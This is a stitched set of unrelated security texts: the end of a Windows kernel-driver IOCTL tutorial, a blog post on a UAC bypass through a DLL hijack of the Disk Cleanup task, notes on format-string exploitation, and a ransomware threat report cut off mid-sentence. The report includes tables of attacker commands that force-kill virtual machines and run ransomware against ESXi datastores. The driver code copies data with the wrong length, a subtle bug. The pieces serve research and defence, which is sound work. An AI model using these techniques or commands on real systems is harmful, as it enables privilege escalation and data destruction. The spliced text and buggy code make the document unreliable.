program\nCreate a simple userland program that can sent a custom defined IOCTL\nto the kernel driver\nPass some data from the userland program to the kernel driver via\nDeviceIoConctrol\nPass some data back from the kernel to the userland program\nBelow are the key code snippets that will make our kernel driver and\nthe userland program.\nKernel Driver\nPopulating DriverObject with IRP Callback Routines\nInside driver's entry function, we populate our driver object with\npointers to important routines that will be executed, for example, when\nthe driver is unloaded or a handle to its device's symbolic link is\nobtained (IRP_MJ_CREATE) or closed (IRP_MJ_CLOSE):\nThis is required, because these driver functions (callbacks) will be\ncalled by the OS when those events (i.e a userland application trying\nto obtain a handle to our device, unload the driver or close device's\nhandle) will fire. We do not want the OS to not know what to do with\nour driver when those events fire, therefore we tell it.\nCreating Device and its Symbolic Link\nThis is where we create a device (that we are writing the driver for)\nand its symbolic link. The symbolic link is required for when we want\nto access our driver from the userland (by opening a handle to the\ndevice by calling CreateFile) and ask it to execute some code in\nrespose to our custom defined IOCTL:\nIOCTL control code is a code that is sent to the device driver from\nvia an RP_MJ_DEVICE_CONTROL request using DeviceIoControl WinAPI.\nIOCTL control code tells the driver what action the driver needs to\nperform.\nFor example, IOCTL code 0x202 (IOCTL_STORAGE_EJECT_MEDIA) could be\nsent to a USB\/CDROM device and its driver would carry out an\nappropriate action for the given device, i.e open the CD tray for a\nCD-ROM or eject the USB media storage.\nBelow shows the device name and its symbolic link we are using in this\nexercise:\nAfter the device and its symbolic links are created, the newly created\ndevice SpotlessDevice is now visible inside WinObj:\nAdditionally, we can see the symbolic link SpotlessDeviceLink pointing\nto our device \\Device\\SpotlessDevice:\nMajorFunctions\nThis function will handle IRPs that request (CreateFile) or close\n(CloseHandle) the handle to our device \\Device\\SpotlessDevice through\nthe symbolic link \\\\.\\SpotlessDeviceLink:\nBelow shows how IRP requests IRP_MJ_CREATE (for obtaining a handle to\n\\Device\\SpotlessDevice through the symbolic link) and IRP_MJ_CLOSE (for\nclosing the handle) are hit when we double click the SpotlessDevice in\nWinObj:\nHandleCustomIOCTL\nThis routine will handle the IOCTL requests sent from our userland\nprogram. In this exercise, when it receives an IOCTL code for\nIOCTL_SPOTLESS, it will print a string that will come from our userland\nprogram's commandline argument. Additionally, it will send back a\nstring for the userland program to print out:\nWhen IoDeviceControl is called in the userland with a custom IOCTL and\nany input data that we want to be sent to the kernel, the OS intercepts\nthat request and packages it into an I\/O Packet (IRP), that will then\nbe handed to our callback HandleCustomIOCTL, that we previously\nregistered in the DriverEntry routine for the IRP\nIRP_MJ_DEVICE_CONTROL.\nIRP, among many other things, contains the incoming IOCTL code, the\ninput data sent from the userland request and a buffer that the kernel\ndriver code can use to send the response back to the userland program.\nDefining Custom IOCTL\nIOCTL code needs to be defined both in the kernel driver as well as\nin the userland program\nIOCTL code is usually defined with a macro [5]CTL_CODE.\nMicrosoft suggests that you can use any code starting from 0x800:\nUserland Program\nBelow is the userland code that obtains a handle to the device\n\\Device\\SpotlessDevice via its symbolic link \\\\.\\SpotlessDeviceLink,\nthat we created earlier inside the driver's DriverEntry routine:\nIssuing a custom defined IOCTL to the driver and sending it a pointer\nto the string that comes as a commandline argument to our userland\nprogram, by calling DeviceIoControl:\nAdditionally, the above code prints out the string received from the\nkernel.\nDemo\nBelow shows how:\n1.\nWe execute our userland program with a string spotless saying ola\nfrom userland as an argument\n2.\nThat argument is sent to the kernel driver via our custom defined\nIOCTL IOCTL_SPOTLESS\n3.\nThe kernel sents back some data to the userland program\n4.\nThe userland program receives text back from the kernel and prints\nit in DbgView\nCode\ndriver.c is the driver code that receives and responds to IOCTL\nrequests sent from the userland and send some data back to the\nuserland program\nuserland.cpp is the userland program sending IOCTL and receiving data\nfrom the kernel driver\ndriver.c\nuserland.cpp\n#include <wdm.h>\n\u200b\nDRIVER_DISPATCH HandleCustomIOCTL;\n#define IOCTL_SPOTLESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2049,\nMETHOD_BUFFERED, FILE_ANY_ACCESS)\nUNICODE_STRING DEVICE_NAME =\nRTL_CONSTANT_STRING(L\"\\\\Device\\\\SpotlessDevice\");\nUNICODE_STRING DEVICE_SYMBOLIC_NAME =\nRTL_CONSTANT_STRING(L\"\\\\??\\\\SpotlessDeviceLink\");\n\u200b\nvoid DriverUnload(PDRIVER_OBJECT dob)\n{\nDbgPrint(\"Driver unloaded, deleting symbolic links and devices\");\nIoDeleteDevice(dob->DeviceObject);\nIoDeleteSymbolicLink(&DEVICE_SYMBOLIC_NAME);\n}\n\u200b\nNTSTATUS HandleCustomIOCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp)\n{\nUNREFERENCED_PARAMETER(DeviceObject);\nPIO_STACK_LOCATION stackLocation = NULL;\nCHAR *messageFromKernel = \"ohai from them kernelz\";\n\u200b\nstackLocation = IoGetCurrentIrpStackLocation(Irp);\nif (stackLocation->Parameters.DeviceIoControl.IoControlCode ==\nIOCTL_SPOTLESS)\n{\nDbgPrint(\"IOCTL_SPOTLESS (0x%x) issued\",\nstackLocation->Parameters.DeviceIoControl.IoControlCode);\nDbgPrint(\"Input received from userland: %s\",\n(char*)Irp->AssociatedIrp.SystemBuffer);\n}\n\u200b\nIrp->IoStatus.Information = strlen(messageFromKernel);\nIrp->IoStatus.Status = STATUS_SUCCESS;\nDbgPrint(\"Sending to userland: %s\", messageFromKernel);\nRtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, messageFromKernel,\nstrlen(Irp->AssociatedIrp.SystemBuffer));\nIoCompleteRequest(Irp, IO_NO_INCREMENT);\n\u200b\nreturn STATUS_SUCCESS;\n}\n\u200b\nNTSTATUS MajorFunctions(PDEVICE_OBJECT DeviceObject, PIRP Irp)\n{\nUNREFERENCED_PARAMETER(DeviceObject);\n\u200b\nPIO_STACK_LOCATION stackLocation = NULL;\nstackLocation = IoGetCurrentIrpStackLocation(Irp);\n\u200b\nswitch (stackLocation->MajorFunction)\n{\ncase IRP_MJ_CREATE:\nDbgPrint(\"Handle to symbolink link %wZ opened\", DEVICE_SYMBOLIC_NAME);\nbreak;\ncase IRP_MJ_CLOSE:\nDbgPrint(\"Handle to symbolink link %wZ closed\", DEVICE_SYMBOLIC_NAME);\nbreak;\ndefault:\nbreak;\n}\nIrp->IoStatus.Information = 0;\nIrp->IoStatus.Status = STATUS_SUCCESS;\nIoCompleteRequest(Irp, IO_NO_INCREMENT);\n\u200b\nreturn STATUS_SUCCESS;\n}\n\u200b\nNTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING\nRegistryPath)\n{\nUNREFERENCED_PARAMETER(DriverObject);\nUNREFERENCED_PARAMETER(RegistryPath);\nNTSTATUS status = 0;\n\u200b\n\/\/ routine that will execute when our driver is unloaded\/service is\nstopped\nDriverObject->DriverUnload = DriverUnload;\n\/\/ routine for handling IO requests from userland\nDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleCustomIOCTL;\n\/\/ routines that will execute once a handle to our device's symbolik\nlink is opened\/closed\nDriverObject->MajorFunction[IRP_MJ_CREATE] = MajorFunctions;\nDriverObject->MajorFunction[IRP_MJ_CLOSE] = MajorFunctions;\nDbgPrint(\"Driver loaded\");\n\u200b\nIoCreateDevice(DriverObject, 0, &DEVICE_NAME, FILE_DEVICE_UNKNOWN,\nFILE_DEVICE_SECURE_OPEN, FALSE, &DriverObject->DeviceObject);\nif (!NT_SUCCESS(status))\n{\nDbgPrint(\"Could not create device %wZ\", DEVICE_NAME);\n}\nelse\n{\nDbgPrint(\"Device %wZ created\", DEVICE_NAME);\n}\n\u200b\nstatus = IoCreateSymbolicLink(&DEVICE_SYMBOLIC_NAME, &DEVICE_NAME);\nif (NT_SUCCESS(status))\n{\nDbgPrint(\"Symbolic link %wZ created\", DEVICE_SYMBOLIC_NAME);\n}\nelse\n{\nDbgPrint(\"Error creating symbolic link %wZ\", DEVICE_SYMBOLIC_NAME);\n}\nreturn STATUS_SUCCESS;\n}\n#include <iostream>\n#include <Windows.h>\n\u200b\n#define IOCTL_SPOTLESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2049,\nMETHOD_BUFFERED, FILE_ANY_ACCESS)\n\u200b\nint main(char argc, char ** argv)\n{\nHANDLE device = INVALID_HANDLE_VALUE;\nBOOL status = FALSE;\nDWORD bytesReturned = 0;\nCHAR inBuffer[128] = {0};\nCHAR outBuffer[128] = {0};\n\u200b\nRtlCopyMemory(inBuffer, argv[1], strlen(argv[1]));\ndevice = CreateFileW(L\"\\\\\\\\.\\\\SpotlessDeviceLink\", GENERIC_WRITE |\nGENERIC_READ | GENERIC_EXECUTE, 0, 0, OPEN_EXISTING,\nFILE_ATTRIBUTE_SYSTEM, 0);\nif (device == INVALID_HANDLE_VALUE)\n{\nprintf_s(\"> Could not open device: 0x%x\\n\", GetLastError());\nreturn FALSE;\n}\n\u200b\nprintf_s(\"> Issuing IOCTL_SPOTLESS 0x%x\\n\", IOCTL_SPOTLESS);\nstatus = DeviceIoControl(device, IOCTL_SPOTLESS, inBuffer,\nsizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned,\n(LPOVERLAPPED)NULL);\nprintf_s(\"> IOCTL_SPOTLESS 0x%x issued\\n\", IOCTL_SPOTLESS);\nprintf_s(\"> Received from the kernel land: %s. Received buffer size:\n%d\\n\", outBuffer, bytesReturned);\n\u200b\nCloseHandle(device);\n}\nReferences\nThe NT Insider:Fun with IOCTLs - Defining Custom I\/O Control Codes\nDeviceIoControl function (ioapiset.h) - Win32 apps\ndocsmsft\nhttps:\/\/www.drdobbs.com\/windows\/sending-ioctls-to-windows-nt-drivers\/18\n4416453\nwww.drdobbs.com\nWindows Drivers Part 2: IOCTLs\nMedium\nUserland\/Kernel communication &#8211; DeviceIoControl method\nEric Asselin\nPrevious\nListing Open Handles and Finding Kernel Object Addresses\nNext\nWindows Kernel Drivers 101\nLast modified 9mo ago\nOn this page\nKernel Driver\nPopulating DriverObject with IRP Callback Routines\nCreating Device and its Symbolic Link\nMajorFunctions\nHandleCustomIOCTL\nDefining Custom IOCTL\nUserland Program\nDemo\nCode\nReferences"}
{"text":"#[1]enigma0x3 \u00bb Feed [2]enigma0x3 \u00bb Comments Feed [3]enigma0x3 \u00bb\nBypassing UAC on Windows 10 using Disk Cleanup Comments Feed\n[4]alternate [5]alternate [6]enigma0x3 [7]WordPress.com\nRed Teamer and Security Addict\n[8]enigma0x3\nPost navigation\n[9]\u00ab Userland Persistence with Scheduled Tasks and COM\nHandler Hijacking\n[10]\u201cFileless\u201d UAC Bypass Using eventvwr.exe and Registry Hijacking \u00bb\nBypassing UAC on Windows 10 using Disk Cleanup\n[11]July 22, 2016 by [12]enigma0x3\nMatt Graeber ([13]@mattifestation) and I recently dug into Windows 10,\nand discovered a rather interesting method of bypassing User Account\nControl (if you aren\u2019t familiar with UAC you can read more about it\n[14]here)[15]. Currently, there are a couple of public UAC bypass\ntechniques, most of which require a privileged file copy using the\nIFileOperation COM object or WUSA extraction to take advantage of a DLL\nhijack. You can dig into some of the public bypasses [16]here (by\n[17]@hfiref0x). The technique covered in this post differs from the\nother methods and provides a useful alternative as it does not rely on\na privileged file copy or any code injection.\nA common technique used to investigate loading behavior on Windows is\nto use [18]SysInternals Process Monitor to analyze how a process\nbehaves when executed. After investigating some default Scheduled Tasks\nthat exist on Windows 10 and their corresponding actions, we found that\na scheduled task named \u201cSilentCleanup\u201d is configured on stock Windows\n10 installations to be launchable by unprivileged users but to run with\nelevated\/high integrity privileges. To find this, we simply went\nthrough each task and inspected the security options for \u201cRun with\nHighest Privileges\u201d to be checked with a non-elevated User Account\n(such as \u2018Users\u2019).\n[19]TaskElevation\nTaking a closer look with procmon, we found that the actual process\nstarted by the scheduled task, cleanmgr.exe, auto-elevates due to\n\u201cexecute with highest privileges\u201d being set in the task configuration.\nLet\u2019s dive in a bit more. When cleanmgr.exe executes, it creates a new\nfolder with the name of a GUID in\n\u201cC:\\Users\\<username>\\AppData\\Local\\Temp\u201d.\n[20]FolderCreation\nOnce cleanmgr.exe creates the temporary folder, it then copies multiple\nDLLs along with \u201cdismhost.exe\u201d into the new folder:\n[21]FileExtraction\nAfter copying DismHost.exe and its DLLs to\n\u201cC:\\Users\\<username>\\AppData\\Temp\\<guid>\u201d, cleanmgr.exe then starts\n\u201cdismhost.exe\u201d out of the newly created path as a high integrity\nprocess:\n[22]dismhostStart\nSince dismhost.exe launches out of\n\u201cC:\\Users\\<username>\\AppData\\Local\\Temp\\<guid>\u201d, it begins to load DLLs\nout of the same folder in a certain order:\n[23]DllsLoaded\nBecause the  current medium integrity process has write access to the\nuser\u2019s %TEMP% directory, it is possible to hijack a DLL loaded by\ndismhost.exe and obtain code execution in a high integrity process.\nThis is commonly known as a \u201c[24]BypassUAC\u201d attack.\nSince this particular situation is a race condition, we have to replace\nthe target DLL before dismhost.exe loads it. We examined the entire\nprocess more closely and determined that \u201cLogProvider.dll\u201d is the last\nDLL loaded by dismhost.exe, giving us the best chance for a hijack\nopportunity. With this information, we can use a WMI event to monitor\nfor the creation of \u201cC:\\Users\\<username>\\AppData\\Local\\Temp\\<guid>\u201d and\nthen assign that WMI event an action of hijacking \u201cLogProvider.dll\u201d by\ncopying our \u201cmalicious\u201d DLL into\n\u201cC:\\Users\\<username>\\AppData\\Local\\Temp\\<guid>\u201d and naming it\n\u201cLogProvider.dll\u201d. Since this action happens before dismhost.exe loads\nit, it will load our DLL instead of the intended one.\n[25]ElevatedDllLoad\nOnce dismhost.exe loads the DLL, it will load as high integrity,\nallowing us to bypass User Access Control and obtain code execution as\na high integrity process.\nAfter additional testing, this technique does not apply to standard\nuser accounts as cleanmgr.exe does not extract any files to %TEMP%.\nWhen executed as a standard user in low or medium integrity, the task\nruns as medium integrity and never elevates past that.\nMatt Graeber ([26]@mattifestation) wrote an excellent PoC PowerShell\nscript that will register a WMI event to monitor for the creation of\nthe GUID folder by cleanmgr.exe and once detected, it will take the\nspecified DLL and copy it to the GUID folder with the name of\n\u201cLogProvider.dll\u201d. Once dismhost.exe goes to load \u201cLogProvider.dll\u201d, it\nwill be our malicious DLL instead of the legitimate one, thus bypassing\nUAC and giving us code execution in High Integrity context. You can\nfind the script\nhere: [27]https:\/\/gist.github.com\/mattifestation\/b4072a066574caccfa07fc\nf723952d54\nTo test this, you simply need the PoC script and a DLL with a standard\nexport of dllmain. For testing, you can either create your own DLL or\nuse a simple MessageBox one located here:\n[28]https:\/\/github.com\/enigma0x3\/MessageBox\nThis technique differs from the other public techniques by having a few\nbenefits that can be handy:\n1. This technique does not require any process injection, meaning the\nattack won\u2019t get flagged by security solutions that monitor for\nthis type of behavior.\n2. There is no privileged file copy required. Most UAC bypasses\nrequire some sort of privileged file copy in order to get a\nmalicious DLL into a secure location to setup a DLL hijack. Since\nthe scheduled task copies the required stuff to %TEMP%, no\nprivileged file copy is required.\n3. This technique cleans up after itself. After the scheduled task is\ndone (and loads our malicious DLL), the task deletes the GUID\nfolder (and files) that it created in %TEMP%.\n4. This technique works with the UAC level being set at its highest\nsetting (\u201cAlways Notify\u201d) since the task is set to run with\n\u201cHighest Privileges\u201d. The majority of the public UAC bypasses rely\non the [29]IFileOperation COM object to perform a privileged file\ncopy. IFileOperation honors the \u201cAlways Notify\u201d UAC setting and\nprompts when set, causing the privileged file copy to fail:\n[30]AlwaysNotify\nThis was disclosed to Microsoft Security Response Center (MSRC) on\n07\/20\/2016. As expected, they responded by noting that UAC isn\u2019t a\nsecurity boundary, so this doesn\u2019t classify as a security\nvulnerability, as stated [31]here. While not a vulnerability, it does\nallow an attacker an alternate method to move to high integrity that\ndiffers from previous bypasses and introduces one more location or\nchokepoint that must be monitored to observe attacker behavior.\nThis particular technique can be remediated or fixed by disabling the\ntask or removing the requirement for running with highest privileges.\nFurther, if you would like to monitor for this attack, you could\nutilize methods\/signatures to look for new WMI events as it is required\nto monitor for new folder creation for this attack to succeed.\nCombining this with App\/DLL whitelisting and monitoring for abnormal\nmodules being loaded (e.g. Sysmon event ID 7) would also limit the\nsuccess of such an attack.\n*Update: As always, users should follow best practices and not use an\nadministrative account for daily computer usage.\nShare this:\n* [32]Twitter\n* [33]Facebook\n*\nLike Loading...\nRelated\nBookmark the [34]permalink.\n3 thoughts on \u201cBypassing UAC on Windows 10 using Disk Cleanup\u201d\n1.\n[35]jen6 says:\n[36]July 27, 2016 at 3:52 pm\nHi I\u2019m student in korea.\nI think this technique is awesome.\nI want to show this article for my friends\nCan I translate this article and upload it?\n[37]Reply\n+\n[38]enigma0x3 says:\n[39]July 27, 2016 at 11:04 pm\nSure thing, as long as the original source is cited.\nThanks!\n[40]Reply\n2. Pingback: [41]Bypassing UAC using App Paths | enigma0x3\nLeave a Reply [42]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nSearch for: ____________________ Search\nRecent Posts\n* [43]CVE-2023-4632: Local Privilege Escalation in Lenovo\nSystem Updater\n* [44]Avira VPN Local Privilege Escalation via Insecure\nUpdate Location\n* [45]CVE-2019-19248: Local Privilege Escalation in EA\u2019s\nOrigin Client\n* [46]Avira Optimizer Local Privilege Escalation\n* [47]CVE-2019-13382: Local Privilege Escalation in SnagIt\nRecent Comments\nRon on [48]CVE-2019-13382: Local Privileg\u2026\nenigma0x3 on [49]CVE-2019-13382: Local Privileg\u2026\nRon on [50]CVE-2019-13382: Local Privileg\u2026\nSoc on [51]Defeating Device Guard: A look\u2026\n[52]\u201cFileless\u2026 on [53]\u201cFileless\u201d UAC Byp\u2026\nArchives\n* [54]October 2023\n* [55]January 2020\n* [56]December 2019\n* [57]August 2019\n* [58]July 2019\n* [59]March 2019\n* [60]January 2019\n* [61]October 2018\n* [62]June 2018\n* [63]January 2018\n* [64]November 2017\n* [65]October 2017\n* [66]September 2017\n* [67]August 2017\n* [68]July 2017\n* [69]April 2017\n* [70]March 2017\n* [71]January 2017\n* [72]November 2016\n* [73]August 2016\n* [74]July 2016\n* [75]May 2016\n* [76]March 2016\n* [77]February 2016\n* [78]January 2016\n* [79]October 2015\n* [80]August 2015\n* [81]April 2015\n* [82]March 2015\n* [83]January 2015\n* [84]October 2014\n* [85]July 2014\n* [86]June 2014\n* [87]March 2014\n* [88]January 2014\nCategories\n* [89]Uncategorized\nMeta\n* [90]Register\n* [91]Log in\n* [92]Entries feed\n* [93]Comments feed\n* [94]WordPress.com\n[95]Blog at WordPress.com.\n* [96]Comment\n* [97]Reblog\n* [98]Subscribe [99]Subscribed\n+ [100]enigma0x3\nJoin 182 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [101]Log in now.\n*\n+ [102]enigma0x3\n+ [103]Customize\n+ [104]Subscribe [105]Subscribed\n+ [106]Sign up\n+ [107]Log in\n+ [108]Copy shortlink\n+ [109]Report this content\n+ [110]View post in Reader\n+ [111]Manage subscriptions\n+ [112]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [113]likes-master\n%d"}
{"text":"#[1]RSS\n[X]\n[2]\nJay Bosamiya\njaybosamiyaude.umc@\n[3]Home[4]Blog[5]CTF-Writeups[6]Experiences[7]Security-Notes[8]Publicat\nions\nAbout Me\n\ud83e\udd8a Software security researcher. PhD student at CMU. CTFer (PPP). Open\nsource dev. BTech from IIT Roorkee.\n[9] RSS [10] @jay_f0xtr0t [11] github\/jaybosamiya\n[12] jaybosamiya@infosec.exchange\n[13] jaybosamiya@mastodon.online\n\u00a9 2023. All rights reserved.\n[14]Jay Bosamiya Software Security Researcher\n\"Advanced\" Format String Exploitation\n06 Apr 2017\nInfluenced by [15]this awesome live stream by Gynvael Coldwind,\nwhere he talks about format string exploitation\nWhile simple format string vulnerabilities are becoming relatively less\ncommon these days, every once in a while, we come across some\ninteresting cases in either CTFs or (less likely) real world programs,\nwhere having a better understanding of how to attack these\nvulnerabilities helps immensely.\nSimple format string exploits:\nYou can use the %p to see what's on the stack. If the format string\nitself is on the stack, then one can place an address (say foo) onto\nthe stack, and then seek to it using the position specifier n$ (for\nexample, AAAA %7$p might return AAAA 0x41414141, if 7 is the position\non the stack). We can then use this to build a read-where primitive,\nusing the %s format specifier instead (for example, AAAA %7$s would\nreturn the value at the address 0x41414141, continuing the previous\nexample). We can also use the %n format specifier to make it into a\nwrite-what-where primitive. Usually instead, we use %hhn (a glibc\nextension, iirc), which lets us write one byte at a time.\nWe use the above primitives to initially beat ASLR (if any) and then\noverwrite an entry in the GOT (say exit() or fflush() or ...) to then\nraise it to an arbitrary-eip-control primitive, which basically gives\nus arbitrary-code-execution.\nPossible difficulties (and \"advanced\" exploitation):\nIf we have partial ASLR, then we can still use format strings and beat\nit, but this becomes much harder if we only have one-shot exploit\n(i.e., our exploit needs to run instantaneously, and the addresses are\nrandomized on each run, say). The way we would beat this is to use\naddresses that are already in the memory, and overwrite them partially\n(since ASLR affects only higher order bits). This way, we can gain\nreliability during execution.\nIf we have a read only .GOT section, then the \"standard\" attack of\noverwriting the GOT will not work. In this case, we look for\nalternative areas that can be overwritten (preferably function\npointers). Some such areas are: __malloc_hook (see man page for the\nsame), stdin's vtable pointer to write or flush, etc. In such a\nscenario, having access to the libc sources is extremely useful. As for\noverwriting the __malloc_hook, it works even if the application doesn't\ncall malloc, since it is calling printf (or similar), and internally,\nif we pass a width specifier greater than 64k (say %70000c), then it\nwill call malloc, and thus whatever address was specified at the global\nvariable __malloc_hook.\nIf we have our format string buffer not on the stack, then we can still\ngain a write-what-where primitive, though it is a little more complex.\nFirst off, we need to stop using the position specifiers n$, since if\nthis is used, then printf internally copies the stack (which we will be\nmodifying as we go along). Now, we find two pointers that point ahead\ninto the stack itself, and use those to overwrite the lower order bytes\nof two further ahead pointing pointers on the stack, so that they now\npoint to x+0 and x+2 where x is some location further ahead on the\nstack. Using these two overwrites, we are able to completely control\nthe 4 bytes at x, and this becomes our where in the primitive. Now we\njust have to ignore more positions on the format string until we come\nto this point, and we have a write-what-where primitive.\n[16]Tweet this Category: [17]Security-Notes\nRelated Posts\n* [18]Misc RE Tips 12 Aug 2017\n* [19]Analysis for RE and Pwning tasks in CTFs 02 Jul 2017\n* [20]Return Oriented Programming 04 Jun 2017"}
{"text":"IFRAME:\n[1]https:\/\/www.googletagmanager.com\/ns.html?id=GTM-5V5LPNC&nojs=1\n____________________\nHypervisor Jackpotting, Part 2: eCrime Actors Increase Targeting of ESXi\nServers with Ransomware\nAugust 30, 2021\n[2]Michael Dawson [3]From The Front Lines\nmenacing illustration\nThis is Part 2 of a three-part blog series. Read [4]Part 1 and [5]Part\n3.\n* CrowdStrike has observed a significant increase in eCrime actors\ntargeting VMware ESXi hypervisors with ransomware since our\nFebruary 2021 blog post on [6]Hypervisor Jackpotting.\n* Many of these adversaries share common tradecraft such as gaining\ninteractive access via SSH, listing and terminating running VM\nprocesses prior to encryption, and targeting the vmfs\/volumes\ndatastore path to encrypt disk volumes and snapshots.\n* Several defensive controls, listed later in this blog, should be\nimplemented to mitigate the success or impact of hypervisor\njackpotting.\nIn February 2021, CrowdStrike blogged about [7]Hypervisor Jackpotting,\na technique that involves targeting VMware ESXi hypervisors with\nransomware to increase the scope of impact. CrowdStrike noted that two\nbig game hunting (BGH) adversaries, [8]CARBON SPIDER and SPRITE SPIDER,\nwere observed utilizing this technique with their respective ransomware\nvariants, Darkside and Defray777. Since then, CrowdStrike has observed\na significant uptrend in hypervisor jackpotting by other adversaries,\nincluding [9]PINCHY SPIDER and VIKING SPIDER. In this blog, we overview\neach new campaign CrowdStrike has observed targeting ESXi systems and\ndetail defensive controls that can be implemented to protect these\ncritical assets.\nBabuk Locker\nIn March 2021, operators of Babuk Locker ransomware offered access to\nan ESXi variant as part of a sought-out partnership opportunity. In May\n2021, CrowdStrike Services observed a victim targeted with this ESXi\nvariant. The ransomware appends the file extension .babyk_esxi to files\nit encrypts, and creates a ransom note named How To Restore Your\nFiles.txt. The ransom note contains two URLs: a victim-specific .onion\nURL for communications, and one for the Babuk Locker dedicated leak\nsite (DLS).\nFERAL SPIDER and DeathKitty\nSince March 2021, FERAL SPIDER, the developers and operators of\nDeathKitty (aka HelloKitty) ransomware added functionality to terminate\nand encrypt virtual machines running on a VMware ESXi hypervisor. If\nVMware ESXi targeting is enabled (-e option), the ransomware will only\nencrypt file extensions related to disk volumes and snapshots: .vmdk,\n.vmsd and .vmsn. When executed with the -k argument, the ransomware\nwill terminate all running virtual machines using VMware ESXi\u2019s\ncommand-line administration utility (esxcli) prior to beginning the\nencryption process.\nCYBORG SPIDER and Pysa\nSince May 2021, CYBORG SPIDER, the developers and operators of Pysa\nransomware, have targeted ESXi servers for encryption. After\ncompromising an environment, CYBORG SPIDER operators move laterally to\nthe hypervisors via HTTPS using the native ESXi root account, where\nthey enable SSH for a remote shell. The operators then use PuTTY and\nWinSCP to copy the ransomware to the \/tmp directory and execute the\ncommands shown in Table 1.\nCommand Description\npython --version Check version of Python installed\ncd \/tmp\/ Change to \/tmp\/ directory\nchmod +x <FILENAME> Add execute permission to Pysa script\n.\/<FILENAME> \/vmfs\/volumes 4096 Execute Pysa against the VM datastore\npath\nTable 1. Pysa commands\nCrowdStrike observed multiple cases in which the Pysa ransomware script\nwas tailored for the version of Python installed on the ESXi, with Pysa\nfilenames 27 and 3 noted as highly likely to correspond with Python\nv2.7 or v3.x. The ransomware also appends the file extension .pysa to\nfiles it encrypts, and creates a ransom note named\nRECOVER_YOUR_DATA.txt at the root (\/) of the volume. The ransom note\nprovides two email addresses, hosted on OnionMail and ProtonMail, for\ncommunications and includes Pysa\u2019s DLS .onion domain.\nPINCHY SPIDER and REvix\nSince June 2021, PINCHY SPIDER has distributed a Linux ransomware\nvariant named REvix to target ESXi systems. The ELF binary uses the\nsame encryption algorithm as PINCHY SPIDER\u2019s Windows REvil ransomware.\nThe ransomware contains a JSON configuration block that specifies the\nransom note filename and encrypted file extension to use. For example,\nin a sample of REvix v1.1c, the ransomware was configured to append the\nfile extension .rhkrc to encrypted files, and use the name\nrhkrc-readme.txt as the ransom note. By default, the ransomware will\nencrypt only the current directory and requires the --path option to\nspecify the target folder (e.g., \/vmfs\/), which is then recursively\nenumerated. Prior to encryption, the ransomware executes the commands\nshown in Table 2.\nCommand Description\npkill -9 vmx-* Terminate any processes named vmx-*\nesxcli --formatter=csv --format-param=fields==\"WorldID,DisplayName\" vm\nprocess list | awk -F \"\\\"*,\\\"*\" {system(\"esxcli vm process kill\n--type=force --world-id=\" $1)} List the running VMs on this system and\nforce terminate each VM based on the enumerated list of World IDs\nTable 2. REvix commands\nIn July 2021, PINCHY SPIDER began distributing REvix v1.2a, which added\nexecution of VM termination functionality within a separate thread, and\nsupport for additional encryption types. In mid-July 2021, PINCHY\nSPIDER\u2019s DLS infrastructure went offline, leaving in question the\nfuture of these operations.\nVIKING SPIDER and Ragnar Locker\nSince June 2021, VIKING SPIDER has deployed Ragnar Locker\u2019s ELF binary\nto ESXi systems via SSH using the native root account. VIKING SPIDER\ncopies the binary to the \/tmp directory and issues the commands shown\nin Table 3.\nCommand Description\nuname -a Print all system information\nesxcli system version get Display the product name, version and build\ninformation\nesxcli system hostname get Display the fully qualified hostname of the\nESXi host\nesxcli system account list List local user accounts\nesxcli --formatter=csv vm process list List the running VMs on this\nsystem\nesxcli vm process kill -w <WID> -t soft Perform a \u201csoft\u201d kill (clean\nshutdown) of the VM associated with the given World ID\nThis command is repeated for each running VM to kill\nesxcli --formatter=csv vm process list List the running VMs on this\nsystem (again) to confirm they are all shutdown\nfind \/vmfs\/volumes\/ -type f -name \"*.vmdk\" Search for all virtual disk\nfiles within the VM datastore path\nchmod a+x \/tmp\/<FILENAME> Add execute permission to Ragnar Locker\nbinary\n\/tmp\/<FILENAME> \/vmfs\/volumes\/<UUID>\/ Execute Ragnar Locker against the\nVM datastore path\nps | grep <FILENAME> Ensure Ragnar Locker process is running\nTable 3. Ragnar Locker commands\nThe ransomware appends the file extension .crypted to files it\nencrypts, and creates a ransom note per encrypted file using the\noriginal filename appended with the extension\n.crypted.README_TO_RESTORE. The ransom note includes a unique victim\nURL for live chat communications via Tor, as well as VIKING SPIDER\u2019s\ndedicated leak site (DLS) .onion domain.\nHow to Protect Your Cluster\nListed below are CrowdStrike\u2019s top five recommendations that\norganizations should implement to mitigate the success or impact of\nhypervisor jackpotting.\n* Avoid direct access to ESXi hosts. Use the vSphere Client to\nadminister ESXi hosts that are managed by a vCenter Server. Do not\naccess managed hosts directly with the VMware Host Client, and do\nnot change managed hosts from the Direct Console User Interface\n(DCUI). (Note: This is a VMware-specific recommendation.)\n* If direct access to an ESXi host is necessary, use a hardened jump\nserver with multifactor authentication. ESXi DCUI access should be\nlimited to a jump server used for only administrative or privileged\npurposes with full auditing capabilities and multifactor\nauthentication (MFA) enabled.\n* Ensure vCenter is not exposed to the internet over SSH or HTTP.\nCrowdStrike has observed adversaries gaining initial access to\nvCenter using valid accounts or exploiting remote code execution\n(RCE) vulnerabilities (e.g., CVE-2021-21985). Although these\nvulnerabilities have been addressed by VMware, these services\nshould not be exposed to the internet to mitigate risk.\n* Ensure ESXi datastore volumes are regularly backed up.\nSpecifically, virtual machine disk images and snapshots should be\nbacked up daily (more frequently if possible) to an offsite storage\nprovider.\n* If encryption activity is observed, do not shut down the ESXi\nhosts. If encryption activity is observed, system administrators\nmay be tempted to reboot or shutdown VMs. Be aware that\n[10]ransomware is not able to modify locked files, and if a VM is\nstill powered on, it will be considered locked. As a result,\nshutting down or rebooting VMs will actually release the lock and\nallow the ransomware to encrypt the virtual disk files.\nAdditional ESXi security recommendations are available from 